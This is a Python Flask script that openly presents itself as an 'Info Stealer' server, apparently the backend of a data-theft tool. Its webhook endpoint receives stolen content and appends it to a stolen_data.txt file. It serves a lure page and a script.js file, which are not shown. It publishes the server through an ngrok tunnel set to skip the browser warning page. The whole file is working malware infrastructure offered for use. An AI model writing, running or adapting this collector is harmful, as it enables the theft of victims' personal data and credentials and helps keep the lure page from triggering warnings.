from flask import Flask, render_template, request, abort, send_from_directory, make_response
from flask_cors import CORS
from pyfiglet import Figlet
from pyngrok import ngrok, conf
from threading import Thread
from time import sleep
from colorama import Fore, Style
import subprocess
import sys

f = Figlet('slant')

banner_figlet = f.renderText('Info Stealer')

data_stolen_banner = f.renderText('STOLEN INFO')

app = Flask(__name__, static_folder='static')
CORS(app)

@app.route('/webhook', methods=['POST'])
def webhook():
    if request.method == 'POST':
        try:
            content = request.json.get('content')
            if content:
                with open('stolen_data.txt', 'a') as f:
                    f.write(data_stolen_banner + '\n')
                    f.write(content + '\n\n')
                return "Webhook received and data stored!", 200
            else:
                return "No content received in the request!", 400
        except Exception as e:
            print(f"Error: {e}")
            return "An error occurred while processing the request!", 500
    else:
        abort(400)

@app.route('/')
def render():
    return render_template('index.html')

@app.route('/static/<path:filename>')
def custom_static(filename):
    if filename == 'script.js':
        if request.headers.get('Host') != request.host:
            print(f"Blocked access to script.js from {request.headers.get('Host')}")
            abort(403)
    response = make_response(send_from_directory(app.static_folder, filename))
    response.headers['Cache-Control'] = 'no-store'
    return response

@app.before_request
def block_directory_traversal():
    if '/../' in request.path:
        abort(403)

@app.errorhandler(403)
def forbidden_error(e):
    return "403 Forbidden: You don't have permission to access this resource.", 403

def run_flask():
    app.run(host='127.0.0.1', port=8080)

def run_ngrok():
    try:
        # Connect ngrok with bind_tls and metadata to skip browser warning
        http_tunnel = ngrok.connect(addr="8080", bind_tls=True, metadata="ngrok-skip-browser-warning")
        print("[ ! ] HTTP TUNNEL: ", http_tunnel.public_url)
        app.ngrok_tunnel_url = http_tunnel.public_url  # Store the ngrok tunnel URL in the Flask app instance
        
        while True:
            sleep(1)
    except KeyboardInterrupt:
        ngrok.disconnect(http_tunnel.public_url)
        print("[ ! ] Tunnels closed")
        sys.exit(0)

if __name__ == '__main__':
    auth_token = input("Ngrok Auth Token: ")
    ngrok.set_auth_token(f"{auth_token}")
    subprocess.run(["ngrok", "config", "upgrade"])

    # No need for the YAML configuration file here
    print(Fore.RED)
    print(banner_figlet)
    flask_thread = Thread(target=run_flask)
    flask_thread.start()
    run_ngrok()
    print(Fore.WHITE, Style.RESET_ALL)
